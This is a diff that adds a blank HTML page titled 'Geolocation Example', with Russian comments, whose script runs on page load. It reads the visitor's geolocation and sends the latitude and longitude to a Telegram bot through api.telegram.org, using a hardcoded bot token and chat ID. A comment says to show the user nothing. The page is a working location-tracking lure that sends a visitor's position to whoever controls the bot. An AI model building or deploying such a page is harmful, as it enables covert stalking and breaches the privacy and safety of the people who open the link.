@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Geolocation Example</title>
+</head>
+<body>
+    <!-- Не показывать пользователю ничего -->
+
+    <script>
+        // Функция для отправки геолокации на Telegram бота
+        function sendLocationToBot(latitude, longitude) {
+            // Замените YOUR_BOT_TOKEN на токен вашего бота
+            const botToken = '6968895449:AAHWOFy13ul5omGZ6ejCMZS3EeANu3D8OsU';
+            // Замените YOUR_CHAT_ID на chat_id вашего чата с ботом
+            const chatId = '5682662110';
+            // Сообщение с геолокацией
+            const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
+            // URL для отправки сообщения с геолокацией на Telegram
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            // Параметры запроса
+            const params = {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            };
+            // Отправка запроса к API Telegram
+            fetch(telegramUrl, params)
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    console.log('Location sent to Telegram bot:', data);
+                })
+                .catch(error => {
+                    console.error('There has been a problem with your fetch operation:', error);
+                });
+        }
+
+        // Функция для получения геолокации
+        function getLocation() {
+            if (navigator.geolocation) {
+                // Получение текущей позиции пользователя
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    // Получение широты и долготы
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+                    // Отправка геолокации на Telegram бота
+                    sendLocationToBot(latitude, longitude);
+                }, function(error) {
+                    // Обработка ошибок
+                    switch (error.code) {
+                        case error.PERMISSION_DENIED:
+                            alert("User denied the request for Geolocation.");
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            alert("Location information is unavailable.");
+                            break;
+                        case error.TIMEOUT:
+                            alert("The request to get user location timed out.");
+                            break;
+                        case error.UNKNOWN_ERROR:
+                            alert("An unknown error occurred.");
+                            break;
+                    }
+                });
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            }
+        }
+
+        // Автоматически вызываем функцию для получения геолокации при загрузке страницы
+        getLocation();
+    </script>
+</body>
+</html>
